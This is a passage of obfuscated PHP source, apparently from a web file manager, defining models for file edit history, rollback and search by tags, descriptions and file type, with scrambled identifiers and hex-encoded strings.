$¤âïË˜Å, $èø£©¶Š[2238] => $ìÔ›ä[$èø£©¶Š[193]], $èø£©¶Š[1797] => $ìÔ›ä[$èø£©¶Š[529]], $èø£©¶Š[498] => $èø£©¶Š[2259], $èø£©¶Š[499] => $ìÔ›ä[$èø£©¶Š[234]], $èø£©¶Š[1799] => $èø£©¶Š[12])); } return $this->eventListParse($„Æ±„ô·, $¤âïË˜Å); } private function eventListParse($€Ïôø±¨, $¯Ã‚İÖ´) { $Ÿşõ£—ı =& $_SERVER[¯‘·½]; $ê³ÎşÊ† = $€Ïôø±¨[$Ÿşõ£—ı[447]]; $¢°æ«“‘ = array_to_keyvalue($ê³ÎşÊ†, $Ÿşõ£—ı[12], $Ÿşõ£—ı[194]); $Ä¹á×ø = array_to_keyvalue($ê³ÎşÊ†, $Ÿşõ£—ı[12], $Ÿşõ£—ı[2244]); foreach ($ê³ÎşÊ† as $¸•Ì‚º×) { $°àº“Í = $¸•Ì‚º×[$Ÿşõ£—ı[528]]; if ($¸•Ì‚º×[$Ÿşõ£—ı[33]] == $Ÿşõ£—ı[627] && isset($°àº“Í[$Ÿşõ£—ı[1263]])) { $¢°æ«“‘[] = $°àº“Í[$Ÿşõ£—ı[1263]] . $Ÿşõ£—ı[12]; $¢°æ«“‘[] = $°àº“Í[$Ÿşõ£—ı[1264]] . $Ÿşõ£—ı[12]; } if ($¸•Ì‚º×[$Ÿşõ£—ı[33]] == $Ÿşõ£—ı[2255] && isset($°àº“Í[$Ÿşõ£—ı[194]])) { $¢°æ«“‘[] = $°àº“Í[$Ÿşõ£—ı[194]] . $Ÿşõ£—ı[12]; } } $¢°æ«“‘ = array_merge($¢°æ«“‘, $Ä¹á×ø, array($¯Ã‚İÖ´ . $Ÿşõ£—ı[12])); $¢°æ«“‘ = array_unique($¢°æ«“‘); $Ô·Ê¡½» = array_unique(array_to_keyvalue($ê³ÎşÊ†, $Ÿşõ£—ı[12], $Ÿşõ£—ı[1806])); $¥òÒ°–» = Model($Ÿşõ£—ı[601])->userListInfo($Ô·Ê¡½»); $ĞˆÇß¬‰ = Model($Ÿşõ£—ı[916])->sourceListInfo($¢°æ«“‘, !0); foreach ($ê³ÎşÊ† as &$¸•Ì‚º×) { if ($¸•Ì‚º×[$Ÿşõ£—ı[33]] == $Ÿşõ£—ı[627] && isset($¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[1263]])) { $¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[1263]] = $ĞˆÇß¬‰[$¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[1263]]]; $¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[1264]] = $ĞˆÇß¬‰[$¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[1264]]]; } if ($¸•Ì‚º×[$Ÿşõ£—ı[33]] == $Ÿşõ£—ı[2255] && isset($¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[194]])) { $¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[194]] = $ĞˆÇß¬‰[$¸•Ì‚º×[$Ÿşõ£—ı[528]][$Ÿşõ£—ı[194]]]; } $¸•Ì‚º×[$Ÿşõ£—ı[90]] = $ĞˆÇß¬‰[$¸•Ì‚º×[$Ÿşõ£—ı[194]]]; $¸•Ì‚º×[$Ÿşõ£—ı[2260]] = $ĞˆÇß¬‰[$¸•Ì‚º×[$Ÿşõ£—ı[2244]]]; if ($¸•Ì‚º×[$Ÿşõ£—ı[33]] == $Ÿşõ£—ı[1251]) { $¸•Ì‚º×[$Ÿşõ£—ı[2260]] = $¸•Ì‚º×[$Ÿşõ£—ı[90]]; $¸•Ì‚º×[$Ÿşõ£—ı[2244]] = $¸•Ì‚º×[$Ÿşõ£—ı[2260]][$Ÿşõ£—ı[194]]; $¸•Ì‚º×[$Ÿşõ£—ı[90]] = !1; $¸•Ì‚º×[$Ÿşõ£—ı[194]] = $Ÿşõ£—ı[12]; } $¸•Ì‚º×[$Ÿşõ£—ı[2189]] = $¥òÒ°–»[$¸•Ì‚º×[$Ÿşõ£—ı[1806]]]; } unset($¸•Ì‚º×); $€Ïôø±¨[$Ÿşõ£—ı[447]] = $ê³ÎşÊ†; return $€Ïôø±¨; } public function removeBySource($¡¯„ëãµ) { $Œ³ŞÛÌ = array($_SERVER[¯‘·½][493] => $¡¯„ëãµ); $this->where($Œ³ŞÛÌ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\143\x65\137\x68\x69\163\x74\157\162\x79"; public function historyCount($Á¿»ş¦¾) { $Ğã†ƒÛ¾ =& $_SERVER[¯‘·½]; if (!$Á¿»ş¦¾) { return array(); } if (is_string($Á¿»ş¦¾) || is_int($Á¿»ş¦¾)) { $Á¿»ş¦¾ = array($Á¿»ş¦¾); } $ó¿ú‚Ò = array($Ğã†ƒÛ¾[194], $Ğã†ƒÛ¾[2261] => $Ğã†ƒÛ¾[569]); $¢æÇ ø­ = array($Ğã†ƒÛ¾[194] => array($Ğã†ƒÛ¾[7], $Á¿»ş¦¾)); $ÂÃşâ«á = $this->field($ó¿ú‚Ò)->where($¢æÇ ø­)->group($Ğã†ƒÛ¾[194])->select(); return array_to_keyvalue($ÂÃşâ«á, $Ğã†ƒÛ¾[194], $Ğã†ƒÛ¾[569]); } public function addHistory($À£âñ¹õ, $×´ÙŞ¦ = '') { $¦¤‚»š =& $_SERVER[¯‘·½]; $¡˜ ş· = array($¦¤‚»š[493] => $À£âñ¹õ[$¦¤‚»š[194]], $¦¤‚»š[1797] => isset($À£âñ¹õ[$¦¤‚»š[531]]) ? $À£âñ¹õ[$¦¤‚»š[531]] : $À£âñ¹õ[$¦¤‚»š[529]], $¦¤‚»š[546] => $À£âñ¹õ[$¦¤‚»š[545]], $¦¤‚»š[624] => $À£âñ¹õ[$¦¤‚»š[79]], $¦¤‚»š[2262] => $×´ÙŞ¦); if ($GLOBALS[$¦¤‚»š[6]][$¦¤‚»š[92]][$¦¤‚»š[1326]] >= 1) { $this->historyAutoClear($¡˜ ş·[$¦¤‚»š[194]]); $this->add($¡˜ ş·); } Hook::trigger($¦¤‚»š[2263], $¡˜ ş·); Model($¦¤‚»š[2264])->eventFileEdit($À£âñ¹õ[$¦¤‚»š[194]]); } private function historyAutoClear($èØïğÏê) { $é›ì¨ìŒ =& $_SERVER[¯‘·½]; $ûúÀ«­û = Model($é›ì¨ìŒ[856])->get($é›ì¨ìŒ[1348]); $±Ó‘ÊÍ’ = intval($GLOBALS[$é›ì¨ìŒ[6]][$é›ì¨ìŒ[92]][$é›ì¨ìŒ[1326]]); $¢öÄñ›¶ = $ûúÀ«­û == $é›ì¨ìŒ[1349] ? min(5, $±Ó‘ÊÍ’) : $±Ó‘ÊÍ’; $¢öÄñ›¶ = $¢öÄñ›¶ <= 0 ? 0 : $¢öÄñ›¶ - 1; if ($¢öÄñ›¶ >= 499) { return; } $ˆ­¹ã´ = array($é›ì¨ìŒ[493] => $èØïğÏê); $ñ£—òºó = $this->field($é›ì¨ìŒ[2265])->where($ˆ­¹ã´)->order($é›ì¨ìŒ[2258])->select(); if (!$ñ£—òºó || $¢öÄñ›¶ >= count($ñ£—òºó)) { return; } $Ò®ƒÏ–… = array_to_keyvalue($ñ£—òºó, $é›ì¨ìŒ[12], $é›ì¨ìŒ[477]); $Ò®ƒÏ–… = array_slice($Ò®ƒÏ–…, $¢öÄñ›¶); $™£ıŒ¸‰ = array_to_keyvalue($ñ£—òºó, $é›ì¨ìŒ[12], $é›ì¨ìŒ[545]); $™£ıŒ¸‰ = array_slice($™£ıŒ¸‰, $¢öÄñ›¶); if (!$Ò®ƒÏ–… || !$™£ıŒ¸‰) { return; } $ˆ­¹ã´ = array($é›ì¨ìŒ[495] => array($é›ì¨ìŒ[7], $Ò®ƒÏ–…)); $this->where($ˆ­¹ã´)->delete(); Model($é›ì¨ìŒ[548])->remove($™£ıŒ¸‰); } public function listData($îÊËä®Ç) { $ĞÅ’ËÜá =& $_SERVER[¯‘·½]; $«Ûô÷Œ‰ = array($ĞÅ’ËÜá[493] => $îÊËä®Ç); $ĞòşÜÁÉ = $ĞÅ’ËÜá[2266]; $çš½øå© = $this->field($ĞòşÜÁÉ)->where($«Ûô÷Œ‰)->order($ĞÅ’ËÜá[2258])->selectPage(); $this->_listAppendUser($çš½øå©[$ĞÅ’ËÜá[447]]); $…°å”è÷ = Model($ĞÅ’ËÜá[856])->get($ĞÅ’ËÜá[1348]); $îœ‡¹¨¯ = 5; if ($…°å”è÷ == $ĞÅ’ËÜá[1349]) { $çš½øå©[$ĞÅ’ËÜá[447]] = array_slice($çš½øå©[$ĞÅ’ËÜá[447]], 0, $îœ‡¹¨¯); $çš½øå©[$ĞÅ’ËÜá[444]] = array($ĞÅ’ËÜá[2267] => 1, $ĞÅ’ËÜá[2268] => 20, $ĞÅ’ËÜá[2269] => 1, $ĞÅ’ËÜá[2270] => count($çš½øå©[$ĞÅ’ËÜá[447]])); } return $çš½øå©; } protected function _listAppendUser(&$ÕİĞåşÔ) { $Ìáñ¿Î¡ =& $_SERVER[¯‘·½]; $‚§í˜’Ç = array_to_keyvalue($ÕİĞåşÔ, $Ìáñ¿Î¡[12], $Ìáñ¿Î¡[1806]); $‡Ÿå„Ó“ = Model($Ìáñ¿Î¡[601])->userListInfo($‚§í˜’Ç); foreach ($ÕİĞåşÔ as &$  ‚ä´œ) { $”¯Ø¾óÒ = $  ‚ä´œ[$Ìáñ¿Î¡[1806]]; $  ‚ä´œ[$Ìáñ¿Î¡[529]] = $‡Ÿå„Ó“[$”¯Ø¾óÒ] ? $‡Ÿå„Ó“[$”¯Ø¾óÒ] : !1; } unset($  ‚ä´œ); } public function fileInfo($ŠñÜ¼§™, $©“Ä¯· = false) { $Õª´í™ =& $_SERVER[¯‘·½]; $½²«…ë = $this->tablePrefix; $Óºı±à = "{$½²«…ë}\x69\157\x5f\x66\151\x6c\x65\40\146\x69\x6c\145\163\40\x6f\x6e\x20\146\x69\154\145\163\56\x66\151\154\x65\111\104\40\x3d\40\150\x69\x73\164\x6f\x72\171\56\146\151\x6c\145\111\104"; $îÉĞî¬† = $this->alias($Õª´í™[2271])->where(array($Õª´í™[495] => $ŠñÜ¼§™))->join($Óºı±à, $Õª´í™[2272])->find(); if ($îÉĞî¬† && $©“Ä¯·) { $‹ØÓ «Ä = array($Õª´í™[194] => $îÉĞî¬†[$Õª´í™[194]], $Õª´í™[477] => array($Õª´í™[1109], $ŠñÜ¼§™)); $îÉĞî¬†[$Õª´í™[1692]] = $this->where($‹ØÓ «Ä)->count(); } return $îÉĞî¬†; } public function removeItem($â»·Å®Ğ) { $Ì•ƒşåı =& $_SERVER[¯‘·½]; $ş§ü³¶¤ = array($Ì•ƒşåı[495] => $â»·Å®Ğ); $ˆÉÖ¨¼¼ = $this->where($ş§ü³¶¤)->find(); if ($ˆÉÖ¨¼¼) { $Ìèá¶‚ = $this->where($ş§ü³¶¤)->delete(); Model($Ì•ƒşåı[548])->remove($ˆÉÖ¨¼¼[$Ì•ƒşåı[545]]); return $Ìèá¶‚; } return !1; } public function removeBySource($æŞ¶¿) { $óæ¼Õª¶ =& $_SERVER[¯‘·½]; if (!$æŞ¶¿) { return !1; } if (!is_array($æŞ¶¿)) { $æŞ¶¿ = array($æŞ¶¿); } $ÖÅß¢¾ø = array($óæ¼Õª¶[493] => array($óæ¼Õª¶[7], $æŞ¶¿)); $›Ü®Šàú = $this->field($óæ¼Õª¶[546])->where($ÖÅß¢¾ø)->select(); if ($›Ü®Šàú) { $this->where($ÖÅß¢¾ø)->delete(); $î¡ßÛÒ = array_to_keyvalue($›Ü®Šàú, $óæ¼Õª¶[12], $óæ¼Õª¶[545]); Model($óæ¼Õª¶[548])->remove($î¡ßÛÒ); } return !0; } public function setDetail($Úší‚‹Ú, $î‹ÙíÏ·) { $Ø¬­Áß¾ =& $_SERVER[¯‘·½]; return $this->where(array($Ø¬­Áß¾[495] => $Úší‚‹Ú))->save(array($Ø¬­Áß¾[2262] => $î‹ÙíÏ·)); } public function rollbackToItem($Ç‰ÔÔ·Æ, $ÂÂ¨Ø¡è) { $ÑÒˆÇı =& $_SERVER[¯‘·½]; $ÚÂîÙçˆ = Model($ÑÒˆÇı[916])->sourceInfo($Ç‰ÔÔ·Æ); $this->addHistory($ÚÂîÙçˆ, LNG($ÑÒˆÇı[2273])); $ÏòÍÖìÙ = $this->find($ÂÂ¨Ø¡è); $ÉŠèÑ¨¼ = array($ÑÒˆÇı[545] => $ÏòÍÖìÙ[$ÑÒˆÇı[545]], $ÑÒˆÇı[79] => $ÏòÍÖìÙ[$ÑÒˆÇı[79]], $ÑÒˆÇı[88] => time(), $ÑÒˆÇı[531] => USER_ID); Model($ÑÒˆÇı[916])->where(array($ÑÒˆÇı[194] => $Ç‰ÔÔ·Æ))->save($ÉŠèÑ¨¼); return $this->where(array($ÑÒˆÇı[495] => $ÂÂ¨Ø¡è))->delete(); } public function clearSame($ëÛôûÀ) { $ô„êú×Ï =& $_SERVER[¯‘·½]; $ÍÙ—Å°¸ = $this->listData($ëÛôûÀ); $ë¤¨«¨¯ = array_to_keyvalue_group($ÍÙ—Å°¸, $ô„êú×Ï[545]); $Ö¦ê®æã = array(); $’£¾óä€ = array(); foreach ($ë¤¨«¨¯ as $ÈÀÊ©¿à) { if (!$ÈÀÊ©¿à || count($ÈÀÊ©¿à) <= 1) { continue; } foreach ($ÈÀÊ©¿à as $˜¥µ®™) { $Ö¦ê®æã[] = $˜¥µ®™[$ô„êú×Ï[545]]; $’£¾óä€[] = $˜¥µ®™[$ô„êú×Ï[477]]; } } if (!$’£¾óä€) { return; } $this->where(array($ô„êú×Ï[477] => array($ô„êú×Ï[7], $’£¾óä€)))->delete(); Model($ô„êú×Ï[548])->remove($Ö¦ê®æã); } public function userSpace() { $ùÀò‚´ =& $_SERVER[¯‘·½]; $¾Üı˜ö = $this->tablePrefix; $ÃşÏ¹óı = array($ùÀò‚´[1797] => USER_ID); $“ëÇÏ®„ = "{$¾Üı˜ö}\x69\x6f\137\146\x69\x6c\145\40\146\x69\x6c\x65\163\40\x6f\156\x20\146\151\154\145\x73\56\146\151\154\145\111\104\40\75\40\x68\x69\163\x74\x6f\162\171\x2e\x66\151\154\145\x49\x44"; return $this->alias($ùÀò‚´[2271])->where($ÃşÏ¹óı)->join($“ëÇÏ®„, $ùÀò‚´[2272])->sum($ùÀò‚´[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¹Èıõ©£) { $À—·Ûó‘ =& $_SERVER[¯‘·½]; $á¸ò•´¹ = KodIO::fileTypeList(); $ˆŞğ’» = $á¸ò•´¹[$¹Èıõ©£]; if (!$ˆŞğ’») { return array(); } $ã¬»ßìï = $ˆŞğ’»[$À—·Ûó‘[169]]; $™—ñÚµĞ = $À—·Ûó‘[7]; if (!$ˆŞğ’»[$À—·Ûó‘[169]]) { $ËÊÏŒÌó = array_to_keyvalue($á¸ò•´¹, $À—·Ûó‘[12], $À—·Ûó‘[169]); $ã¬»ßìï = implode($À—·Ûó‘[50], $ËÊÏŒÌó); $™—ñÚµĞ = $À—·Ûó‘[2274]; } $³Ó÷©»Ç = explode($À—·Ûó‘[50], trim($ã¬»ßìï, $À—·Ûó‘[50])); return array($™—ñÚµĞ, $³Ó÷©»Ç); } public function listPathType($“š”« ) { $ĞñîÁ¿¤ =& $_SERVER[¯‘·½]; $ØÓŸ ƒ = $this->fileTypeWhere($“š”« ); if (!$ØÓŸ ƒ) { return array(); } $†¾’ıá„ = USER_ID; $şÄù¨¬„ = Model($ĞñîÁ¿¤[601])->getInfo($†¾’ıá„); $ÀÁ“óøş = array($ĞñîÁ¿¤[655] => SourceModel::TYPE_USER, $ĞñîÁ¿¤[588] => array($ĞñîÁ¿¤[619], $ĞñîÁ¿¤[597] . $şÄù¨¬„[$ĞñîÁ¿¤[90]][$ĞñîÁ¿¤[194]] . $ĞñîÁ¿¤[620]), $ĞñîÁ¿¤[656] => $†¾’ıá„, $ĞñîÁ¿¤[653] => 0, $ĞñîÁ¿¤[654] => $ØÓŸ ƒ); return $this->listSource($ÀÁ“óøş); } public function listSearch($ı•ÀÎ™, $Ê ÆÍŒÔ = 300) { $šøııŸ¦ =& $_SERVER[¯‘·½]; if (isset($ı•ÀÎ™[$šøııŸ¦[2105]]) && $ı•ÀÎ™[$šøııŸ¦[2105]]) { $ı•ÀÎ™[$šøııŸ¦[2105]] = str_replace($šøııŸ¦[462], $šøııŸ¦[2275], trim($ı•ÀÎ™[$šøııŸ¦[2105]])); } $ó­Ôñ÷Î = $this->_parseSearchWhere($ı•ÀÎ™); if (!isset($ó­Ôñ÷Î[$šøııŸ¦[507]])) { $ó­Ôñ÷Î[$šøııŸ¦[507]] = 0; } $÷áÏ¢… = $šøııŸ¦[2276]; $´ú“ğ­Œ = $ó­Ôñ÷Î; $¡ş‘íÊ» = $÷áÏ¢…; $this->_listSearchBindPinyin($ı•ÀÎ™, $ó­Ôñ÷Î, $÷áÏ¢…); $this->alias($šøııŸ¦[521])->_makeOrder(); $ó­Ôñ÷Î = $this->parseWhereLike($ó­Ôñ÷Î); $©çíÕç = $this->distinct(!0)->field($÷áÏ¢…)->where($ó­Ôñ÷Î)->selectPage($Ê ÆÍŒÔ); if ($GLOBALS[$šøııŸ¦[6]][$šøııŸ¦[459]][$šøııŸ¦[460]] && Input::check($ı•ÀÎ™[$šøııŸ¦[2105]], $šøııŸ¦[662]) && $©çíÕç[$šøııŸ¦[444]][$šøııŸ¦[430]] == 1 && $©çíÕç[$šøııŸ¦[444]][$šøııŸ¦[445]] == 0) { $©çíÕç = $this->distinct(!0)->field($÷áÏ¢…)->where($´ú“ğ­Œ)->limit(1000)->select(); $©çíÕç = array_page_split($©çíÕç, !1, $Ê ÆÍŒÔ); } $this->_listSearchFileContent($©çíÕç, $ı•ÀÎ™, $¡ş‘íÊ», $´ú“ğ­Œ); $this->_listSearchDesc($©çíÕç, $ı•ÀÎ™, $¡ş‘íÊ»); $this->_listSearchTag($©çíÕç, $ı•ÀÎ™, $¡ş‘íÊ»); $this->_listSearchGroupTag($©çíÕç, $ı•ÀÎ™, $¡ş‘íÊ»); $this->_listDataApply($©çíÕç[$šøııŸ¦[447]]); $this->_listMake($©çíÕç); return $©çíÕç; } private function _listSearchFileContent(&$Ç°ïŞ, $¨œûÆ, $ÅÅÇ¶õ, $œ®±¢€) { $²ß¬£ˆì =& $_SERVER[¯‘·½]; if (!$¨œûÆ[$²ß¬£ˆì[2105]] || $Ç°ïŞ[$²ß¬£ˆì[444]][$²ß¬£ˆì[430]] > 1) { return; } if (!isset($œ®±¢€[$²ß¬£ˆì[32]]) || !is_array($¨œûÆ[$²ß¬£ˆì[545]])) { return; } $œ®±¢€[$²ß¬£ˆì[545]] = array($²ß¬£ˆì[7], $¨œûÆ[$²ß¬£ˆì[545]]); unset($œ®±¢€[$²ß¬£ˆì[32]]); unset($¨œûÆ[$²ß¬£ˆì[545]]); $ñşÔŞ¡ = $this->field($ÅÅÇ¶õ)->where($œ®±¢€)->limit($²ß¬£ˆì[2277])->select(); if (!$ñşÔŞ¡ || count($ñşÔŞ¡) == 0) { return; } $Ç°ïŞ[$²ß¬£ˆì[447]] = array_merge($ñşÔŞ¡, $Ç°ïŞ[$²ß¬£ˆì[447]]); $Ç°ïŞ[$²ß¬£ˆì[444]][$²ß¬£ˆì[445]] += count($ñşÔŞ¡); } private function _listSearchTag(&$¾Âı”, $‚©ŠŠ, $çö¶èêã) { $èŸ¤©öÏ =& $_SERVER[¯‘·½]; if (empty($‚©ŠŠ[$èŸ¤©öÏ[1966]]) || !in_array($èŸ¤©öÏ[2278], $‚©ŠŠ[$èŸ¤©öÏ[1966]])) { return; } if (!$‚©ŠŠ[$èŸ¤©öÏ[2105]] || $¾Âı”[$èŸ¤©öÏ[444]][$èŸ¤©öÏ[430]] > 1) { return; } $‰í úÕ¶ = Model($èŸ¤©öÏ[2279])->listData(); $Óê“Şâ = array(); $«¤ºÆëº = $‚©ŠŠ[$èŸ¤©öÏ[2105]]; foreach ($‰í úÕ¶ as $ÅîŸƒÂú) { $ëÏø’­¬ = $ÅîŸƒÂú[$èŸ¤©öÏ[32]]; $ü»×ÜßÀ = str_replace($èŸ¤©öÏ[53], $èŸ¤©öÏ[12], Pinyin::get($ëÏø’­¬)); if (stripos($ëÏø’­¬, $«¤ºÆëº) !== !1 || stripos($ü»×ÜßÀ, $«¤ºÆëº) !== !1) { $Óê“Şâ[] = $ÅîŸƒÂú[$èŸ¤©öÏ[477]]; } } if (!$Óê“Şâ) { return; } $«ÊçØ×é = array($èŸ¤©öÏ[502] => array($èŸ¤©öÏ[7], $Óê“Şâ), $èŸ¤©öÏ[1806] => USER_ID); $šëñùı = Model($èŸ¤©öÏ[504])->field($èŸ¤©öÏ[87])->where($«ÊçØ×é)->select(); $šëñùı = array_to_keyvalue($šëñùı, $èŸ¤©öÏ[12], $èŸ¤©öÏ[87]); $¸«Çàıâ = array_unique($šëñùı); $this->_listSearchMerge($¾Âı”, $‚©ŠŠ, $çö¶èêã, $¸«Çàıâ); } private function _listSearchDesc(&$²¸„÷Ú, $À¦œéÉö, $¶€áîÛÆ) { $ö¬íÀš =& $_SERVER[¯‘·½]; if (empty($À¦œéÉö[$ö¬íÀš[1966]]) || !in_array($ö¬íÀš[528], $À¦œéÉö[$ö¬íÀš[1966]])) { return; } if (!$À¦œéÉö[$ö¬íÀš[2105]] || $²¸„÷Ú[$ö¬íÀš[444]][$ö¬íÀš[430]] > 1) { return; } $»£ëùåî = array($ö¬íÀš[97] => $ö¬íÀš[528], $ö¬íÀš[452] => array($ö¬íÀš[461], $ö¬íÀš[2107] . $À¦œéÉö[$ö¬íÀš[2105]] . $ö¬íÀš[2107])); $ùÏ™éŒ° = !1; if ($ùÏ™éŒ°) { $›Ãƒï¾ = $this->listSearchChildren($À¦œéÉö[$ö¬íÀš[193]]); $›Ãƒï¾ = array_unique($›Ãƒï¾); if (!$›Ãƒï¾) { return; } $»£ëùåî[$ö¬íÀš[194]] = array($ö¬íÀš[7], $›Ãƒï¾); } $ïş¼ô¶ö = Model($ö¬íÀš[639])->field($ö¬íÀš[194])->where($»£ëùåî)->limit(5000)->select(); $±õ¼‚ù = array_to_keyvalue($ïş¼ô¶ö, $ö¬íÀš[12], $ö¬íÀš[194]); $this->_listSearchMerge($²¸„÷Ú, $À¦œéÉö, $¶€áîÛÆ, $±õ¼‚ù); } private function _listSearchGroupTag(&$¤¹Ô¢¬Õ, $¨³­ôğ, $¹´¨°ƒ) { $‡¤†¹§‘ =& $_SERVER[¯‘·½]; if (empty($¨³­ôğ[$‡¤†¹§‘[1966]]) || !in_array($‡¤†¹§‘[2278], $¨³­ôğ[$‡¤†¹§‘[1966]])) { return; } if (!$¨³­ôğ[$‡¤†¹§‘[2105]] || $¤¹Ô¢¬Õ[$‡¤†¹§‘[444]][$‡¤†¹§‘[430]] > 1 || !$¨³­ôğ[$‡¤†¹§‘[193]]) { return; } $«ŸŸ•Ö¤ = $this->sourceInfo($¨³­ôğ[$‡¤†¹§‘[193]]); if (!$«ŸŸ•Ö¤ || $«ŸŸ•Ö¤[$‡¤†¹§‘[191]] != SourceModel::TYPE_GROUP) { return; } $êí ·² = $«ŸŸ•Ö¤[$‡¤†¹§‘[573]]; $İÀ ¶•æ = Model($‡¤†¹§‘[2280])->get($êí ·²); $Ï¿¡½´„ = array(); $Î¨ÌÇ—à = $¨³­ôğ[$‡¤†¹§‘[2105]]; foreach ($İÀ ¶•æ[$‡¤†¹§‘[447]] as $èùºü€Ã) { $•´©è¸¬ = $èùºü€Ã[$‡¤†¹§‘[32]]; $¸Ë£Áè = str_replace($‡¤†¹§‘[53], $‡¤†¹§‘[12], Pinyin::get($•´©è¸¬)); if (stripos($•´©è¸¬, $Î¨ÌÇ—à) !== !1 || stripos($¸Ë£Áè, $Î¨ÌÇ—à) !== !1) { $Ï¿¡½´„[] = $èùºü€Ã[$‡¤†¹§‘[477]]; } } if (!$Ï¿¡½´„) { return; } $¼Àêş›ó = array($‡¤†¹§‘[502] => array($‡¤†¹§‘[7], $Ï¿¡½´„), $‡¤†¹§‘[1806] => 0, $‡¤†¹§‘[33] => $‡¤†¹§‘[1410] . $êí ·²); $œÈ„ÜÛ‰ = Model($‡¤†¹§‘[504])->field($‡¤†¹§‘[87])->where($¼Àêş›ó)->select(); $œÈ„ÜÛ‰ = array_to_keyvalue($œÈ„ÜÛ‰, $‡¤†¹§‘[12], $‡¤†¹§‘[87]); $µ€¾òÃÊ = array_unique($œÈ„ÜÛ‰); $this->_listSearchMerge($¤¹Ô¢¬Õ, $¨³­ôğ, $¹´¨°ƒ, $µ€¾òÃÊ); } private function _listSearchMerge(&$‡ş –ûÇ, $çê¢ïÔ, $À¨Ø×™ú, $ˆâÅ½¡Æ) { $²‡­½ù =& $_SERVER[¯‘·½]; if (!$ˆâÅ½¡Æ) { return; } $ÕóÜ¼©Å = array_to_keyvalue($‡ş –ûÇ[$²‡­½ù[447]], $²‡­½ù[12], $²‡­½ù[194]); $‡Æª¬äÒ = array_diff($ˆâÅ½¡Æ, $ÕóÜ¼©Å); if (!$‡Æª¬äÒ) { return; } $ÏÏûÃÂÒ = array($²‡­½ù[194] => array($²‡­½ù[7], $‡Æª¬äÒ)); $êÂ¸ÚúÓ = $this->field($À¨Ø×™ú)->where($ÏÏûÃÂÒ)->select(); if (!$êÂ¸ÚúÓ) { return; } $¬üğƒÌ° = array(); foreach ($êÂ¸ÚúÓ as $òôÑ‘²) { if ($this->_listSearchFilter($òôÑ‘², $çê¢ïÔ)) { $¬üğƒÌ°[] = $òôÑ‘²; } } $‡ş –ûÇ[$²‡­½ù[447]] = array_merge($¬üğƒÌ°, $‡ş –ûÇ[$²‡­½ù[447]]); $‡ş –ûÇ[$²‡­½ù[444]][$²‡­½ù[445]] += count($¬üğƒÌ°); } private function _listSearchFilter($ç…›úƒ†, $¯‚«ÄÔŞ) { $ÁîÈÂ” =& $_SERVER[¯‘·½]; $™ˆ“¤“ = $ç…›úƒ†[$ÁîÈÂ”[487]] == $ÁîÈÂ”[91]; if (!strstr($ç…›úƒ†[$ÁîÈÂ”[588]], $ÁîÈÂ”[50] . $¯‚«ÄÔŞ[$ÁîÈÂ”[193]] . $ÁîÈÂ”[50])) { return !1; } if (isset($¯‚«ÄÔŞ[$ÁîÈÂ”[488]]) && $¯‚«ÄÔŞ[$ÁîÈÂ”[488]] != $ÁîÈÂ”[862]) { if ($¯‚«ÄÔŞ[$ÁîÈÂ”[488]] == $ÁîÈÂ”[78] && !$™ˆ“¤“) { return !1; } if ($¯‚«ÄÔŞ[$ÁîÈÂ”[488]] != $ÁîÈÂ”[78] && $™ˆ“¤“) { return !1; } if (!strstr($ç…›úƒ†[$ÁîÈÂ”[169]], $ÁîÈÂ”[50] . $¯‚«ÄÔŞ[$ÁîÈÂ”[488]] . $ÁîÈÂ”[50])) { return !1; } } if (isset($¯‚«ÄÔŞ[$ÁîÈÂ”[2281]]) && $¯‚«ÄÔŞ[$ÁîÈÂ”[2281]] < $ç…›úƒ†[$ÁîÈÂ”[79]]) { return !1; } if (isset($¯‚«ÄÔŞ[$ÁîÈÂ”[2282]]) && $¯‚«ÄÔŞ[$ÁîÈÂ”[2282]] > $ç…›úƒ†[$ÁîÈÂ”[79]]) { return !1; } if (isset($¯‚«ÄÔŞ[$ÁîÈÂ”[669]]) && $¯‚«ÄÔŞ[$ÁîÈÂ”[669]] != $ç…›úƒ†[$ÁîÈÂ”[531]]) { return !1; } return !0; } public function listSearchChildren($Ÿö“ˆçÃ, $»âÚëö° = 5000) { $èì£‹ºò =& $_SERVER[¯‘·½]; $ª¨Åµ¤ = array(); $‰…ñØ = $this->sourceInfo($Ÿö“ˆçÃ); $¶âÉø¨ú = array($èì£‹ºò[588] => array($èì£‹ºò[461], $‰…ñØ[$èì£‹ºò[588]] . $‰…ñØ[$èì£‹ºò[194]] . $èì£‹ºò[620])); $‡££¬ = $this->field($èì£‹ºò[79])->where($¶âÉø¨ú)->limit($»âÚëö° + 1)->select(); $üè·Æ¶µ = is_array($‡££¬) ? count($‡££¬) : 0; if ($üè·Æ¶µ > $»âÚëö°) { return $this->_listSearchChildrenNear($Ÿö“ˆçÃ, $»âÚëö°); } $Â»İÙ¸® = $this->field($èì£‹ºò[194])->where($¶âÉø¨ú)->select(); $ª¨Åµ¤ = array_to_keyvalue($Â»İÙ¸®, $èì£‹ºò[12], $èì£‹ºò[194]); return $ª¨Åµ¤; } private function _listSearchChildrenNear($µÆ¾ì€, $”ÏÉÈ¼¢) { $»²é˜ê =& $_SERVER[¯‘·½]; $Åıè®ÙÃ = array(); $æšÎè´÷ = array($»²é˜ê[193] => $µÆ¾ì€); $³£òõº = $this->field($»²é˜ê[2283])->where($æšÎè´÷)->select(); $©ß›¹Îµ = array_to_keyvalue(array_filter_by_field($³£òõº, $»²é˜ê[487], $»²é˜ê[91]), $»²é˜ê[12], $»²é˜ê[194]); $Åıè®ÙÃ = array_merge($Åıè®ÙÃ, array_to_keyvalue($³£òõº, $»²é˜ê[12], $»²é˜ê[194])); if (!$©ß›¹Îµ) { return $Åıè®ÙÃ; } $æšÎè´÷ = array($»²é˜ê[193] => array($»²é˜ê[7], $©ß›¹Îµ)); $³£òõº = $this->field($»²é˜ê[2283])->where($æšÎè´÷)->limit($”ÏÉÈ¼¢)->select(); $Åıè®ÙÃ = array_merge($Åıè®ÙÃ, array_to_keyvalue($³£òõº, $»²é˜ê[12], $»²é˜ê[194])); 